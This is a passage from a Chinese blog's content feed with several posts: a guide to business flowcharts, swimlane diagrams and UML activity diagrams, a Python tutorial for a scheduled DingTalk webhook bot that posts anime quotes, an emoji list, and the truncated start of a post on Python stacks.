，PD需要思考什么功能能够取代某个环节的人肉工作（功能需求，系统流程）</li><li>不管是怎么样的功能最终都会以界面的方式呈现，设计师们会关注用户在系统里的任务流，行为路径，让用户完成任务更加高效愉悦。（页面流程）<br>当然，除了业务流程，系统流程，页面流程，还有数据流程被人关注。</li></ul><p>我们平时工作中，还会经常听人谈到泳道图、任务流程图等等概念，究竟是神马关系呢？</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161710485.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><p>在工作中，我们经常能够看到两种业务流程图，从表现形式来看，一种很好区分，俗称为“泳道图”的它，在样子上也确实像个泳道，可以有横向的泳道，也会有纵向的泳道。泳道图在某些文档里会被称为“以活动为单位的流程图”，浮在泳道中的都是一个个活动。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161822815.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><p>另外一种类型是以部门和岗位为单位的流程图，下图中的圆形就代表一个个部门或岗位。矩形代表活动。这种流程图关注事情如何完成的逻辑，但是在体现各个部门的责任上比较弱。如果是某个岗位的人来看，很难像泳道图那样一眼就能看到自己部门的职责和任务。所以现在用得比较少。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161823754.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><p>再回过头来说泳道图，泳道图有几个关键点：两大维度，活动流转，流程要素。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161824958.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="业务流程图是什么？"><a href="#业务流程图是什么？" class="headerlink" title="业务流程图是什么？"></a>业务流程图是什么？</h2><p>业务流程图，顾名思义，用来描述业务流程的一种图，通过一些特定的符号和连线来表示具体某个业务的实际处理步骤和过程，详细地描述任务的流程走向，一般没有数据的概念。</p><h2 id="为什么需要业务流程图？"><a href="#为什么需要业务流程图？" class="headerlink" title="为什么需要业务流程图？"></a>为什么需要业务流程图？</h2><p>分析业务流程，并将业务流程图表化可以帮助分析者了解业务如何运转，帮助分析者找到业务流程中不合理的流向。现有产品存在的业务流程未必是合理的，通过业务流程图，钻研关键事件的流程，分析为什么要这么做，探索出更深层次的问题，从而对现有不合理的业务流程进行重组优化，进而制定优化方案，改进现有流程。</p><p>产品在写需求文档时主要是对业务规则的描述，而配合以业务流程图可以让业务逻辑更清晰；日常梳理关键事件业务流程时，画出业务流程图可以帮助发现不合理流程，从而对关键事件进行优化。</p><h2 id="业务流程图的两种图表类型"><a href="#业务流程图的两种图表类型" class="headerlink" title="业务流程图的两种图表类型"></a>业务流程图的两种图表类型</h2><h3 id="管理业务流程图"><a href="#管理业务流程图" class="headerlink" title="管理业务流程图"></a>管理业务流程图</h3><p>我们现在所说的流程图其实是传统的管理业务流程图，包含基本流程图和跨职能流程图（泳道图）两种。以医院挂号流程为例。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161452762.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>基本流程图虽然明确地说明了整个流程，但却无法清楚地说明每步流程是由哪个角色负责的。为了有效表示各个流程是由谁来负责的，可以通过泳道流程图来实现，这样不仅体现了整个活动控制流，还能清楚知道各个角色在流程中所承担的责任。</p><p>管理业务流程图已基本能满足业务流程走向的表达，但在复杂的系统交互中，表达并发概念时，传统的管理业务流程图已无法表达，这就需要用到UML建模。</p><h3 id="UML活动图"><a href="#UML活动图" class="headerlink" title="UML活动图"></a>UML活动图</h3><p>UML中共定义了13种图，如下，其中用例图、活动图和顺序图用的比较多。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161455530.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>UML细分了各种图，分别在不同的角度来描述系统流程，在本质上，UML各种图均属于流程图。</p><p>其中UML中活动图同管理业务流程图类似可用于表示业务过程，唯一的区别是活动图支持并行行为。传统的流程图着重描述处理过程，它的主要控制结构是顺序、分支和循环，各个处理过程之间有严格的顺序和时间关系；而UML活动图描述的是对象活动的顺序关系所遵循的规则，它着重表现的是系统的行为，而非系统的处理过程。</p><p>{cat_tips_A}<strong>那UML活动图是如何来表示并发业务流程的呢？</strong>{&#x2F;cat_tips_A}</p><p>UML活动图也可包含为基本活动图和泳道活动图，表达的方式与管理业务流程图差不多，但图例上稍有不同（图例区别可参考下方）。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161500099.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>同管理业务流程图一样，泳道让流程中个角色的分工一目了然。一个泳道表示流程内的一个角色，泳道内仅仅画出该泳道所表示角色完成的活动（判断，并行等可以画在任意泳道）。</p><p>总结：管理业务流程图或UML活动图均可以用来表达业务流程，具体使用哪种图来表达业务流程可以凭君喜好，但要遵循一定的符号结构，不要混搭。不过要表达并行行为的还是使用UML活动图吧。</p><h2 id="两种流程图图例和结构"><a href="#两种流程图图例和结构" class="headerlink" title="两种流程图图例和结构"></a>两种流程图图例和结构</h2><h3 id="管理业务流程图-1"><a href="#管理业务流程图-1" class="headerlink" title="管理业务流程图"></a>管理业务流程图</h3><p>管理业务流程图的常用符号如下，其基本结构包含：顺序结构、选择（分支）结构、循环结构。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161502766.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p><img src="https://cos.gjcloak.xyz/pigo/202208161502484.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="UML活动图-1"><a href="#UML活动图-1" class="headerlink" title="UML活动图"></a>UML活动图</h3><p>UML活动图的常用符号如下，其基本结构除了顺序结构、选择（分支）结构和循环结构外，还可能存在并发的事件流。在UML中，可以采用一个同步线来说明这些并行控制流的分岔和汇合。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161508793.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>同步线：分岔是有一个进入转换，两个或多个离开转换；而汇合则是两个或多个进入转换，一个离开转换。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161509735.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="如何绘制流程图？"><a href="#如何绘制流程图？" class="headerlink" title="如何绘制流程图？"></a>如何绘制流程图？</h2><h3 id="在开始绘制业务流程图之前需要先想清楚的2个问题"><a href="#在开始绘制业务流程图之前需要先想清楚的2个问题" class="headerlink" title="在开始绘制业务流程图之前需要先想清楚的2个问题"></a>在开始绘制业务流程图之前需要先想清楚的2个问题</h3><h4 id="所要描述的是哪一段业务流程？"><a href="#所要描述的是哪一段业务流程？" class="headerlink" title="所要描述的是哪一段业务流程？"></a>所要描述的是哪一段业务流程？</h4><p>在画流程图之前先确定业务流程起终点，是截取某一段业务进行详细描述，还是整体业务模块进行描述。不可能将所有的流程都放到一个图里展示，也不可能大而笼统不画出关键事件，要学会划分业务流程范围，把握粒度。</p><p>{cat_tips_E}举例{&#x2F;cat_tips_E}</p><p>还是以医院挂号看病为例，先挂号再看病。整个流程下来其实可以细分为两个流程，分别为挂号流程和看病流程；甚至粒度可以再细点，分为取小票流程、挂号流程、缴挂号费流程、排队看病流程等，但很明显，单独分析取小票流程和缴挂号费流程粒度过小，没有实际意义。</p><p>总结：可采用自顶向下，逐层分解的绘制方法。明确你要梳理的业务流程范围，首先列出流程中的关键事件，如医院挂号看病，挂号流程和看病流程便算是整个流程中的关键事件流程；再结合你分析的目的来判断是否需要再往下层进行分解，如取小票流程、挂号流程、缴挂号费流程、排队看病流程。如此例，层层向下分解，直到符合你要分析的目的，当目的是为了对某个业务流程进行优化时，则分解到对应流程即可，绘制出流程图后再进行分析。</p><h4 id="所要描述的业务流程是否涉及到参与者？"><a href="#所要描述的业务流程是否涉及到参与者？" class="headerlink" title="所要描述的业务流程是否涉及到参与者？"></a>所要描述的业务流程是否涉及到参与者？</h4><p>涉及到参与者的业务流程使用泳道图来描述更简单明了。</p><p>{cat_tips_E}举例{&#x2F;cat_tips_E}</p><p>业务简要描述：数学老师让小丽帮忙把讲台上的写了名字的语文课本送给语文老师，语文老师接下后微笑着对小丽说谢谢。</p><p>分析：包含了数学老师、小丽、语文老师这三个参与者，此时用泳道流程图更合适。</p><h3 id="问题想明白了之后便可以对业务流程进行梳理，进而分解各个要素"><a href="#问题想明白了之后便可以对业务流程进行梳理，进而分解各个要素" class="headerlink" title="问题想明白了之后便可以对业务流程进行梳理，进而分解各个要素"></a>问题想明白了之后便可以对业务流程进行梳理，进而分解各个要素</h3><p>业务流程图有4个关键要素：执行操作、顺序、输入输出、规则；要更清楚的描述业务流程可以有参与者这一要素。</p><ul><li>执行操作：执行了什么操作</li><li>顺序：操作产生的顺序</li><li>输入输出：发生操作的原因和结果</li><li>规则：操作产生的条件</li><li>参与者：谁参与了这个流程，可以是系统、可以是页面，也可以是用户</li></ul><p><strong>以上个例子为例进行分解：</strong></p><p>业务简要描述：数学老师让小丽帮忙把讲台上的写了名字的语文课本送给语文老师，语文老师接下后微笑着对小丽说谢谢。</p><ul><li>执行操作和顺序（含输入输出）：请求帮忙、接受帮忙、拿讲台上的语文课本、递交课本、接收课本、道谢</li><li>规则：必须是写了名字的语文课本</li><li>参与者：数学老师、小丽、语文老师</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202208161515779.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>以上是明确给出了业务描述，按照步骤基本上便能画出业务流程图。在没有明确给出业务描述的情况下，对业务流程的梳理主要有两种方式：</p><ol><li>深入现场调查，由工作人员介绍业务处理过程。<br><img src="https://cos.gjcloak.xyz/pigo/202208161516595.png?imageMogr2/format/webp/interlace/1/quality/80"></li><li>对现有业务流程的优化。当已经对现有业务流程熟悉时，通过讨论和分析，可梳理出业务流程，再通过优化现有流程中不合理的地方，从而给出一个更好的流程来。</li></ol><h3 id="流程图规范"><a href="#流程图规范" class="headerlink" title="流程图规范"></a>流程图规范</h3><ul><li>各图形形状&#x2F;字号统一。如果各个图形形状大小&#x2F;字号相差悬殊，这对于理解图形的人也是一种折磨，对于某个比较重要的流程可以使用颜色来区分其他普通流程（但颜色数量和种类不应太多，以免重点模糊），再在该重要的流程旁加上注释说明，就能将重点转达给对方。</li><li>流程名用动宾结构，如输入手机号。</li><li>流程均以开始框开始，以结束框结束。</li><li>流程图从左到右、从上到下排列。</li><li>流程线尽量不要交叉。</li></ul><h2 id="常见的绘制流程图的工具"><a href="#常见的绘制流程图的工具" class="headerlink" title="常见的绘制流程图的工具"></a>常见的绘制流程图的工具</h2><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="https://www.processon.com/">ProcessOn</a><br><a href="https://www.draw.io/">draw.io</a></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul><li>Microsoft Visio</li><li>edraw亿图</li><li>xmind</li><li>omniGraffle（mac）</li><li>StarUML</li></ul><p>具体用哪种工具不重要，重要的是学会对业务流程进行梳理并将流程可视化</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 业务 </tag>
            
            <tag> 流程图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次 python 制作发送信息的钉钉机器人</title>
      <link href="/136.html"/>
      <url>/136.html</url>
      
        <content type="html"><![CDATA[<h2 id="添加机器人"><a href="#添加机器人" class="headerlink" title="添加机器人"></a>添加机器人</h2><p><img src="https://cos.gjcloak.xyz/pigo/202208061135282.png?imageMogr2/format/webp/interlace/1/quality/80" alt="1" title="1"><br><img src="https://cos.gjcloak.xyz/pigo/202208061136897.png?imageMogr2/format/webp/interlace/1/quality/80" alt="2" title="2"></p><h2 id="点击自定义"><a href="#点击自定义" class="headerlink" title="点击自定义"></a>点击自定义</h2><p><img src="https://cos.gjcloak.xyz/pigo/202208061137221.png?imageMogr2/format/webp/interlace/1/quality/80" alt="3" title="3"></p><h2 id="点击添加"><a href="#点击添加" class="headerlink" title="点击添加"></a>点击添加</h2><p><img src="https://cos.gjcloak.xyz/pigo/202208061138942.png?imageMogr2/format/webp/interlace/1/quality/80" alt="4" title="4"></p><h2 id="设置机器人相关"><a href="#设置机器人相关" class="headerlink" title="设置机器人相关"></a>设置机器人相关</h2><p><img src="https://cos.gjcloak.xyz/pigo/202208061138169.png?imageMogr2/format/webp/interlace/1/quality/80" alt="5" title="5"></p><h2 id="复制webhook链接以备用"><a href="#复制webhook链接以备用" class="headerlink" title="复制webhook链接以备用"></a>复制webhook链接以备用</h2><p><img src="https://cos.gjcloak.xyz/pigo/202208061140621.png?imageMogr2/format/webp/interlace/1/quality/80" alt="6" title="6"></p><h2 id="使用python写语句发送相关信息"><a href="#使用python写语句发送相关信息" class="headerlink" title="使用python写语句发送相关信息"></a>使用python写语句发送相关信息</h2><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 结构体时间与次数对应，这样在循环中只执行一次</span><br><span class="line">class Myclass(object):</span><br><span class="line">    class Struct(object):</span><br><span class="line">        def __init__(self, Ttime, cishu):</span><br><span class="line">            self.Ttime = Ttime</span><br><span class="line">            self.cishu = cishu</span><br><span class="line"></span><br><span class="line">    def make_struct(self, Ttime, cishu):</span><br><span class="line">        return self.Struct(Ttime, cishu)</span><br><span class="line">myclass = Myclass()</span><br><span class="line">#这里随自己更改和添加</span><br><span class="line">test1 = myclass.make_struct(&quot;17:55:15&quot;, 0)</span><br><span class="line">test2 = myclass.make_struct(&quot;01:30:45&quot;, 0)</span><br><span class="line"></span><br><span class="line"># 钉钉机器人显示</span><br><span class="line">def getDingMes():</span><br><span class="line">    # files open</span><br><span class="line">    with open(&#x27;1.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">        contents = file.read()</span><br><span class="line"></span><br><span class="line">    print(ticks_1)</span><br><span class="line">    # 更改为自己的钉钉机器人</span><br><span class="line">    baseUrl = &quot;这里面填写刚刚复制的webhook&quot;</span><br><span class="line"></span><br><span class="line">    # please set charset= utf-8</span><br><span class="line">    HEADERS = &#123;</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json ;charset=utf-8 &quot;</span><br><span class="line">    &#125;</span><br><span class="line">    # 这里的message是你想要推送的文字消息</span><br><span class="line">    message = &quot;@时间：&quot; + ticks + &quot;\n&quot; + contents</span><br><span class="line">    stringBody = &#123;</span><br><span class="line">        &quot;msgtype&quot;: &quot;text&quot;,</span><br><span class="line">        &quot;text&quot;: &#123;&quot;content&quot;: message&#125;,</span><br><span class="line">        &quot;at&quot;: &#123;</span><br><span class="line">            &quot;atMobiles&quot;: [&quot;&quot;],</span><br><span class="line">            &quot;isAtAll&quot;: &quot;false&quot;  # @所有人 时为true，上面的atMobiles就失效了</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MessageBody = json.dumps(stringBody)</span><br><span class="line">    result = requests.post(url=baseUrl, data=MessageBody, headers=HEADERS)</span><br><span class="line">    print(result.text)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    while 1:</span><br><span class="line">        ticks_1 = str(time.strftime(&quot;%H:%M:%S&quot;))  # ticks_1 当前时间(时分秒)</span><br><span class="line">        ticks = str(time.strftime(&quot;%Y %m %d %H:%M&quot;))  # ticks 当前时间（显示）</span><br><span class="line">        # 满足条件发送</span><br><span class="line">        if ticks_1 == test1.Ttime and test1.cishu == 0:</span><br><span class="line">            getDingMes()</span><br><span class="line">            test1.cishu = test1.cishu + 1</span><br><span class="line">        if ticks_1 == test2.Ttime and test2.cishu == 0:</span><br><span class="line">            getDingMes()</span><br><span class="line">            test2.cishu = test2.cishu + 1</span><br><span class="line">        # 每日重置次数，第二天依旧按点发送</span><br><span class="line">        if ticks_1 == &quot;01:32:00&quot;:</span><br><span class="line">            test1.cishu = 0</span><br><span class="line">            test2.cishu = 0</span><br></pre></td></tr></table></figure><h2 id="内容文档-1-txt"><a href="#内容文档-1-txt" class="headerlink" title="内容文档(1.txt)"></a>内容文档(1.txt)</h2><p>内容可自由填写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">真正的危机不是机器人像人一样思考，而是人像机器一样思考。——凉宫春日的忧郁</span><br><span class="line">光就是羁绊之力，它会再度被某人继承，散发出耀眼的光。——奈克瑟斯奥特曼</span><br><span class="line">我的船上没有手下，只有伙伴。——海贼王</span><br><span class="line">没有一封信是不必被送达的。——紫罗兰永恒花园</span><br><span class="line">这是你所不能理解的，人类感情的极致，比希望更热烈，比绝望更深邃——爱！——魔法少女小圆新篇 叛逆的物语</span><br><span class="line">不能逃避，不能逃避，不能逃避，不能逃避…——EVA</span><br><span class="line">凡人、笨蛋！——维多利加·德·布洛瓦</span><br><span class="line">懂得认输是非常重要的，不尝到失败的不甘，也就不会明白跌倒后怎么爬起来，更不可能再向前迈进。——笨蛋测验召唤兽</span><br><span class="line">即使作为代价要夺走我什么，即使接下来等待我的是什么，即使那样，我无论如何都不想失去他。——少年阴阳师</span><br><span class="line">现世为梦，夜梦为真。——《xxxholic》</span><br><span class="line">我知道的，面码…自己已经死掉这点事，还是知道的…——我们仍未知道那天所看见的花的名字</span><br><span class="line">自己的感觉，不说出来，别人也不会懂，如果不懂，就应该互相沟通。——好想告诉你</span><br><span class="line">这个世界上没有完美的人类，所以，人无法自己一个人活著。——不可思议游戏</span><br><span class="line">这东西是越嚼越有味哦~——BanG Dream! 2nd Season</span><br><span class="line">人永远不知道，谁哪次不经意的跟你说了再见之后，就真的不会再见了。——千与千寻</span><br><span class="line">活着本身就是一种价值，因为还有明天。——高达</span><br><span class="line">人的记忆本来就是暧昧的，不值得信任。——叛逆的鲁鲁修R2</span><br><span class="line">想和你重新认识一次 从你叫什么名字说起。——你的名字</span><br></pre></td></tr></table></figure><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>文件<br><img src="https://cos.gjcloak.xyz/pigo/202208061144546.png?imageMogr2/format/webp/interlace/1/quality/80" alt="7" title="7"><br>直接执行 <code>python3.9 dd.py</code>，在<img src="https://cos.gjcloak.xyz/pigo/202208061146093.png?imageMogr2/format/webp/interlace/1/quality/80" alt="8" title="8">到这个设置时间后，便会自动推送钉钉消息，做测试可以时间长度不用设置太长即可<br>运行效果如下：<br><img src="https://cos.gjcloak.xyz/pigo/202208061152810.png?imageMogr2/format/webp/interlace/1/quality/80" alt="9" title="9"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 钉钉机器人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Emoji</title>
      <link href="/778ad936.html"/>
      <url>/778ad936.html</url>
      
        <content type="html"><![CDATA[<h2 id="表情"><a href="#表情" class="headerlink" title="表情"></a>表情</h2><p>😀😁😂😃😄😅😆😇😈😉😊😋😌😍😎😏😐😑😒😓😔😕😖😗😘😙😚😛😜😝😞😟😠😡😢😣😤😥😦😧😨😩😪😫😬😭😮😯😰😱😲😳😴😵😶😷🙁🙂🙃🙄🤐🤑🤒🤓🤔🤕🤠🤡🤢🤣🤤🤥🤧🤨🤩🤪🤫🤬🤭🤮🤯🧐😀😁😂😃😄😅😆😇😈😉😊😋😌😍😎😏😐😑😒😓😔😕😖😗😘😙😚😛😜😝😞😟😠😡😢😣😤😥😦😧😨😩😪😫😬😭😮😯😰😱😲😳😴😵😶😷😸😹😺😻😼😽😾😿🙀🙁🙂🙃🙄</p><h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><p>🅰🅱🅾🅿🆎🆑🆒🆓🆔🆕🆖🆗🆘🆙🆚🈁🈂🈚🈯🈲🈳🈴🈵🈶🈷🈸🈹🈺🉐🉑🌀🌁🌂🌃🌄🌅🌆🌇🌈🌉🌊🌋🌌🌍🌎🌏🌐🌑🌒🌓🌔🌕🌖🌗🌘🌙🌚🌛🌜🌝🌞🌟🌠🌡🌤🌥🌦🌧🌨🌩🌪🌫🌬🌭🌮🌯🌰🌱🌲🌳🌴🌵🌶🌷🌸🌹🌺🌻🌼🌽🌾🌿🍀🍁🍂🍃🍄🍅🍆🍇🍈🍉🍊🍋🍌🍍🍎🍏🍐🍑🍒🍓🍔🍕🍖🍗🍘🍙🍚🍛🍜🍝🍞🍟🍠🍡🍢🍣🍤🍥🍦🍧🍨🍩🍪🍫🍬🍭🍮🍯🍰🍱🍲🍳🍴🍵🍶🍷🍸🍹🍺🍻🍼🍽🍾🍿🎀🎁🎂🎃🎄🎅🎆🎇🎈🎉🎊🎋🎌🎍🎎🎏🎐🎑🎒🎓🎖🎗🎙🎚🎛🎞🎟🎠🎡🎢🎣🎤🎥🎦🎧🎨🎩🎪🎫🎬🎭🎮🎯🎰🎱🎲🎳🎴🎵🎶🎷🎸🎹🎺🎻🎼🎽🎾🎿🏀🏁🏂🏃🏄🏅🏆🏇🏈🏉🏊🏋🏌🏍🏎🏏🏐🏑🏒🏓🏔🏕🏖🏗🏘🏙🏚🏛🏜🏝🏞🏟🏠🏡🏢🏣🏤🏥🏦🏧🏨🏩🏪🏫🏬🏭🏮🏯🏰🏳🏴🏵🏷🏸🏹🏺🏻🏼🏽🏾🏿🐀🐁🐂🐃🐄🐅🐆🐇🐈🐉🐊🐋🐌🐍🐎🐏🐐🐑🐒🐓🐔🐕🐖🐗🐘🐙🐚🐛🐜🐝🐞🐟🐠🐡🐢🐣🐤🐥🐦🐧🐨🐩🐪🐫🐬🐭🐮🐯🐰🐱🐲🐳🐴🐵🐶🐷🐸🐹🐺🐻🐼🐽🐾🐿👀👁👂👃👄👅👆👇👈👉👊👋👌👍👎👏👐👑👒👓👔👕👖👗👘👙👚👛👜👝👞👟👠👡👢👣👤👥👦👧👨👩👪👫👬👭👮👯👰👱👲👳👴👵👶👷👸👹👺👻👼👽👾👿💀💁💂💃💄💅💆💇💈💉💊💋💌💍💎💏💐💑💒💓💔💕💖💗💘💙💚💛💜💝💞💟💠💡💢💣💤💥💦💧💨💩💪💫💬💭💮💯💰💱💲💳💴💵💶💷💸💹💺💻💼💽💾💿📀📁📂📃📄📅📆📇📈📉📊📋📌📍📎📏📐📑📒📓📔📕📖📗📘📙📚📛📜📝📞📟📠📡📢📣📤📥📦📧📨📩📪📫📬📭📮📯📰📱📲📳📴📵📶📷📸📹📺📻📼📽📿🔀🔁🔂🔃🔄🔅🔆🔇🔈🔉🔊🔋🔌🔍🔎🔏🔐🔑🔒🔓🔔🔕🔖🔗🔘🔙🔚🔛🔜🔝🔞🔟🔠🔡🔢🔣🔤🔥🔦🔧🔨🔩🔪🔫🔬🔭🔮🔯🔰🔱🔲🔳🔴🔵🔶🔷🔸🔹🔺🔻🔼🔽🕉🕊🕋🕌🕍🕎🕐🕑🕒🕓🕔🕕🕖🕗🕘🕙🕚🕛🕜🕝🕞🕟🕠🕡🕢🕣🕤🕥🕦🕧🕯🕰🕳🕴🕵🕶🕷🕸🕹🕺🖇🖊🖋🖌🖍🖐🖕🖖🖤🖥🖨🖱🖲🖼🗂🗃🗄🗑🗒🗓🗜🗝🗞🗡🗣🗨🗯🗳🗺🗻🗼🗽🗾🗿🙅🙆🙇🙈🙉🙊🙋🙌🙍🙎🙏🚀🚁🚂🚃🚄🚅🚆🚇🚈🚉🚊🚋🚌🚍🚎🚏🚐🚑🚒🚓🚔🚕🚖🚗🚘🚙🚚🚛🚜🚝🚞🚟🚠🚡🚢🚣🚤🚥🚦🚧🚨🚩🚪🚫🚬🚭🚮🚯🚰🚱🚲🚳🚴🚵🚶🚷🚸🚹🚺🚻🚼🚽🚾🚿🛀🛁🛂🛃🛄🛅🛋🛌🛍🛎🛏🛐🛑🛒🛠🛡🛢🛣🛤🛥🛩🛫🛬🛰🛳🛴🛵🛶🛷🛸🛹🛺🤐🤑🤒🤓🤔🤕🤖🤗🤘🤙🤚🤛🤜🤝🤞🤟🤠🤡🤢🤣🤤🤥🤦🤧🤨🤩🤪🤫🤬🤭🤮🤯🤰🤱🤲🤳🤴🤵🤶🤷🤸🤹🤺🤼🤽🤾🥀🥁🥂🥃🥄🥅🥇🥈🥉🥊🥋🥌🥍🥎🥏🥐🥑🥒🥓🥔🥕🥖🥗🥘🥙🥚🥛🥜🥝🥞🥟🥠🥡🥢🥣🥤🥥🥦🥧🥨🥩🥪🥫🦀🦁🦂🦃🦄🦅🦆🦇🦈🦉🦊🦋🦌🦍🦎🦏🦐🦑🦒🦓🦔🦕🦖🦗🧀🧐🧑🧒🧓🧔🧕🧖🧗🧘🧙🧚🧛🧜🧝🧞🧟🧠🧡🧢🧣🧤🧥🧦 ☝⛹✊✋✌✍🎅🏂🏃🏄🏇🏊🏋🏌👂👃👆👇👈👉👊👋👌👍👎👏👐👦👧👨👩👮👰👱👲👳👴👵👶👷👸👼💁💂💃💅💆💇💪🕴🕵🕺🖐🖕🖖🙅🙆🙇🙋🙌🙍🙎🙏🚣🚴🚵🚶🛀🛌🤘🤙🤚🤛🤜🤝🤞🤟🤦🤰🤱🤲🤳🤴🤵🤶🤷🤸🤹🤽🤾🧑🧒🧓🧔🧕🧖🧗🧘🧙🧚🧜🧝⏫⏬⏭⏮⏯⏰⏱⏲⏳⏸⏹⏺Ⓜ☔☕☝♈♉♊♋♌♍♎♏♐♑♒♓♟♿⚓⚡⚪⚫⚽⚾⛄⛅⛎⛏⛑⛓⛔⛩⛪⛰⛱⛲⛳⛴⛵⛷⛸⛹⛺⛽✂✅✈✉✊✋✌✍✏✒✔✖✝✡✨✳✴❄❇❌❎❓❔❕❗❣❤➕➖➗➡➰➿⤴⤵⬅⬆⬇⬛⬜⭐⭕〰〽㊗㊙🀄🃏</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.emojiall.com/">emojiall</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> emoji </tag>
            
            <tag> 表情 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据结构(三)·栈</title>
      <link href="/139.html"/>
      <url>/139.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>栈是一种数据结构，只能从一端插入和删除操作，遵循着先进后出原则存储数据。</p></blockquote><p><img src="https://cos.gjcloak.xyz/02/image-20201220170815652.png" alt="栈" title="栈"></p><h2 id="3-1-栈的初始化"><a href="#3-1-栈的初始化" class="headerlink" title="3.1 栈的初始化"></a>3.1 栈的初始化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self):</span><br><span class="line">    self.stack = []  # 栈列表</span><br><span class="line">    self.size = 20  # 栈大小</span><br><span class="line">    self.top = -1  # 栈顶位置</span><br></pre></td></tr></table></figure><h2 id="3-2-元素进栈"><a href="#3-2-元素进栈" class="headerlink" title="3.2 元素进栈"></a>3.2 元素进栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 元素进栈</span><br><span class="line">def push(self, element):</span><br><span class="line">    self.stack.append(element)</span><br><span class="line">    self.top += 1</span><br></pre></td></tr></table></figure><h2 id="3-3-元素出栈"><a href="#3-3-元素出栈" class="headerlink" title="3.3 元素出栈"></a>3.3 元素出栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 元素出栈</span><br><span class="line">def pop(self):</span><br><span class="line">    element = self.stack[-1]</span><br><span class="line">    self.top -= 1</span><br><span class="line">    del self.stack[-1]</span><br><span class="line">    return element</span><br></pre></td></tr></table></figure><p>这里可以直接调用pop函数，使用如下：</p><figure 